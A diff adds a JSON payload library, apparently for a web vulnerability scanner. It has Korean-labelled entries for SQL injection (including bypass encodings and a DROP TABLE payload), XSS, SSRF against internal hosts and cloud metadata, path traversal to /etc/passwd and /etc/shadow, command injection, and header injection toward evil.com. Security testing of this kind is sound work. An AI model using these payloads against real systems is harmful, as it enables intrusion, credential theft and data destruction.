@@ -1,0 +1,92 @@
+{
+  "categories": [
+    {
+      "id": "sqli",
+      "name": "SQL Injection",
+      "icon": "🗄️",
+      "color": "#e74c3c",
+      "payloads": [
+        { "id": "sqli_1", "name": "기본 인증 우회", "payload": "' OR '1'='1", "description": "WHERE 절 우회", "risk": "critical" },
+        { "id": "sqli_2", "name": "주석 기반 우회", "payload": "' OR 1=1--", "description": "나머지 쿼리 주석 처리", "risk": "critical" },
+        { "id": "sqli_3", "name": "UNION SELECT", "payload": "' UNION SELECT null,null,null--", "description": "컬럼 수 탐색", "risk": "high" },
+        { "id": "sqli_4", "name": "에러 기반 추출", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "description": "MySQL 버전 정보 추출", "risk": "high" },
+        { "id": "sqli_5", "name": "Blind - Boolean", "payload": "' AND 1=1--", "description": "Boolean 기반 Blind SQLi", "risk": "medium" },
+        { "id": "sqli_6", "name": "Blind - Time", "payload": "'; WAITFOR DELAY '0:0:5'--", "description": "MSSQL 시간 지연", "risk": "medium" },
+        { "id": "sqli_7", "name": "DROP TABLE", "payload": "'; DROP TABLE users--", "description": "테이블 삭제 시도", "risk": "critical" },
+        { "id": "sqli_8", "name": "대소문자 우회", "payload": "' oR '1'='1", "description": "WAF 대소문자 필터 우회", "risk": "high" },
+        { "id": "sqli_9", "name": "URL 인코딩 우회", "payload": "%27%20OR%20%271%27%3D%271", "description": "URL 인코딩 WAF 우회", "risk": "high" },
+        { "id": "sqli_10", "name": "더블 인코딩", "payload": "%2527%2520OR%25201%253D1", "description": "이중 URL 인코딩", "risk": "high" }
+      ]
+    },
+    {
+      "id": "xss",
+      "name": "Cross-Site Scripting",
+      "icon": "📜",
+      "color": "#f39c12",
+      "payloads": [
+        { "id": "xss_1", "name": "기본 Script 태그", "payload": "<script>alert('XSS')</script>", "description": "기본 XSS 탐지", "risk": "high" },
+        { "id": "xss_2", "name": "이미지 이벤트", "payload": "<img src=x onerror=alert('XSS')>", "description": "onerror 이벤트 활용", "risk": "high" },
+        { "id": "xss_3", "name": "SVG 기반", "payload": "<svg onload=alert('XSS')>", "description": "SVG 태그 활용", "risk": "high" },
+        { "id": "xss_4", "name": "JavaScript 프로토콜", "payload": "javascript:alert('XSS')", "description": "javascript: 프로토콜", "risk": "medium" },
+        { "id": "xss_5", "name": "태그 대소문자", "payload": "<ScRiPt>alert('XSS')</ScRiPt>", "description": "대소문자 혼합 우회", "risk": "high" },
+        { "id": "xss_6", "name": "인코딩 우회", "payload": "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;", "description": "HTML 엔티티 인코딩", "risk": "high" },
+        { "id": "xss_7", "name": "이벤트 핸들러", "payload": "\" onmouseover=\"alert('XSS')", "description": "속성 기반 XSS", "risk": "medium" },
+        { "id": "xss_8", "name": "공백 없는 페이로드", "payload": "<svg/onload=alert('XSS')>", "description": "공백 필터 우회", "risk": "high" }
+      ]
+    },
+    {
+      "id": "ssrf",
+      "name": "SSRF",
+      "icon": "🔀",
+      "color": "#9b59b6",
+      "payloads": [
+        { "id": "ssrf_1", "name": "로컬호스트", "payload": "http://127.0.0.1/", "description": "내부 서비스 접근", "risk": "high" },
+        { "id": "ssrf_2", "name": "내부망 스캔", "payload": "http://192.168.1.1/", "description": "내부 라우터 접근 시도", "risk": "critical" },
+        { "id": "ssrf_3", "name": "AWS 메타데이터", "payload": "http://169.254.169.254/latest/meta-data/", "description": "AWS IMDSv1 접근", "risk": "critical" },
+        { "id": "ssrf_4", "name": "파일 프로토콜", "payload": "file:///etc/passwd", "description": "로컬 파일 읽기", "risk": "critical" },
+        { "id": "ssrf_5", "name": "IPv6 localhost", "payload": "http://[::1]/", "description": "IPv6 우회", "risk": "high" },
+        { "id": "ssrf_6", "name": "10진수 IP", "payload": "http://2130706433/", "description": "10진수 IP 우회 (127.0.0.1)", "risk": "high" }
+      ]
+    },
+    {
+      "id": "lfi",
+      "name": "LFI / Path Traversal",
+      "icon": "📁",
+      "color": "#27ae60",
+      "payloads": [
+        { "id": "lfi_1", "name": "기본 Traversal", "payload": "../../../etc/passwd", "description": "Linux passwd 파일 접근", "risk": "high" },
+        { "id": "lfi_2", "name": "Windows 경로", "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "description": "Windows hosts 파일", "risk": "high" },
+        { "id": "lfi_3", "name": "URL 인코딩", "payload": "..%2F..%2F..%2Fetc%2Fpasswd", "description": "URL 인코딩 우회", "risk": "high" },
+        { "id": "lfi_4", "name": "이중 인코딩", "payload": "..%252F..%252F..%252Fetc%252Fpasswd", "description": "이중 URL 인코딩", "risk": "high" },
+        { "id": "lfi_5", "name": "Null 바이트", "payload": "../../../etc/passwd%00", "description": "Null 바이트 종료", "risk": "medium" },
+        { "id": "lfi_6", "name": "절대 경로", "payload": "/etc/shadow", "description": "직접 절대 경로 접근", "risk": "critical" }
+      ]
+    },
+    {
+      "id": "cmdi",
+      "name": "Command Injection",
+      "icon": "💻",
+      "color": "#e67e22",
+      "payloads": [
+        { "id": "cmdi_1", "name": "세미콜론 분리", "payload": "; id", "description": "명령어 분리 실행", "risk": "critical" },
+        { "id": "cmdi_2", "name": "파이프 연결", "payload": "| whoami", "description": "파이프로 명령 실행", "risk": "critical" },
+        { "id": "cmdi_3", "name": "AND 연산", "payload": "&& cat /etc/passwd", "description": "AND 조건 명령 실행", "risk": "critical" },
+        { "id": "cmdi_4", "name": "백틱 치환", "payload": "`id`", "description": "백틱 명령 치환", "risk": "critical" },
+        { "id": "cmdi_5", "name": "서브쉘", "payload": "$(whoami)", "description": "$() 서브쉘 실행", "risk": "critical" },
+        { "id": "cmdi_6", "name": "시간 지연", "payload": "; sleep 5", "description": "Blind CMDi 탐지", "risk": "high" }
+      ]
+    },
+    {
+      "id": "header",
+      "name": "Header Injection",
+      "icon": "📋",
+      "color": "#1abc9c",
+      "payloads": [
+        { "id": "hdr_1", "name": "Host 헤더 조작", "payload": "evil.com", "description": "Host 헤더 인젝션", "risk": "medium", "header": "Host" },
+        { "id": "hdr_2", "name": "X-Forwarded-For", "payload": "127.0.0.1", "description": "IP 우회 시도", "risk": "medium", "header": "X-Forwarded-For" },
+        { "id": "hdr_3", "name": "User-Agent 조작", "payload": "<script>alert(1)</script>", "description": "UA 기반 XSS", "risk": "low", "header": "User-Agent" },
+        { "id": "hdr_4", "name": "Referer 조작", "payload": "http://evil.com", "description": "Referer 기반 우회", "risk": "low", "header": "Referer" }
+      ]
+    }
+  ]
+}
